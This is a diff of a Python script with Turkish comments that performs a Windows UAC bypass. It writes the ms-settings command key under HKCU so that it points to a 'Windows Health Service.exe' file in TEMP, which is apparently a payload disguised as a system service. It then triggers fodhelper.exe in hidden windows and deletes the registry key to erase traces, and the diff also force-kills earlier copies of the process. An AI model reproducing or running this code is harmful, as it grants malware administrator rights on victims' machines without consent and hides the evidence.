@@ -4,58 +4,72 @@ import subprocess
 import time
 import sys
 
-def kill_process(process_name):
-    """Çalışan eski süreci kapatır."""
+def force_kill_process(process_name):
+    """Süreci hem taskkill hem de WMIC ile kapatmaya zorlar."""
     try:
-        # /F zorla kapatır, /IM isim ile kapatır, /T alt süreçleri de kapatır
+        # 1. Yöntem: Taskkill (Boşluklu isimlere karşı tırnak içinde)
         subprocess.run(
             f'taskkill /F /IM "{process_name}" /T', 
             shell=True, 
             creationflags=subprocess.CREATE_NO_WINDOW
         )
+        
+        # 2. Yöntem: WMIC (Taskkill'in yetemediği durumlar için ek önlem)
+        # İsmi .exe olmadan da kontrol eder
+        clean_name = process_name.replace(".exe", "")
+        subprocess.run(
+            f'wmic process where "name=\'{process_name}\'" delete', 
+            shell=True, 
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        subprocess.run(
+            f'wmic process where "name=\'{clean_name}\'" delete', 
+            shell=True, 
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        
         # Kapanması için kısa bir süre bekle
-        time.sleep(2)
+        time.sleep(3)
     except:
         pass
 
-def bypass_uac_and_run(exe_path):
+def bypass_uac_and_run():
     target_name = "Windows Health Service.exe"
     
-    # 1. ADIM: Eski olanı kapat
-    kill_process(target_name)
+    # 1. ADIM: ESKİ SÜRECİ ÖLDÜR
+    force_kill_process(target_name)
 
+    # 2. ADIM: YOLLARI AYARLA
     reg_path = r'Software\Classes\ms-settings\shell\open\command'
     temp_folder = os.environ.get('TEMP')
     full_path = os.path.join(temp_folder, target_name)
 
-    # Dosya kontrolü
     if not os.path.exists(full_path):
         return
 
     try:
-        # 2. ADIM: Kayıt defteri işlemleri (Bypass için)
+        # 3. ADIM: KAYIT DEFTERİ BYPASS (Fodhelper için)
         winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
         with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
-            # Boşluklu yollar için çift tırnak önemli
+            # Boşluklu yollar için üç kat tırnak kullanımı Windows için en garantisidir
             winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{full_path}"')
             winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
         
-        # 3. ADIM: Yeni kopyayı tetikle
+        # 4. ADIM: TETİKLE
         subprocess.run(
             "fodhelper.exe", 
             shell=True, 
             creationflags=subprocess.CREATE_NO_WINDOW
         )
         
-        # Kayıt defterinin okunması için bekle
+        # Sistemin dosyayı açması için bekle
         time.sleep(5)
 
-        # 4. ADIM: İzleri temizle
+        # 5. ADIM: İZLERİ TEMİZLE
         winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
 
     except:
         pass
 
 if __name__ == "__main__":
-    # Ekrana hiçbir çıktı vermez ve her şeyi arka planda yapar
-    bypass_uac_and_run("")
+    bypass_uac_and_run()
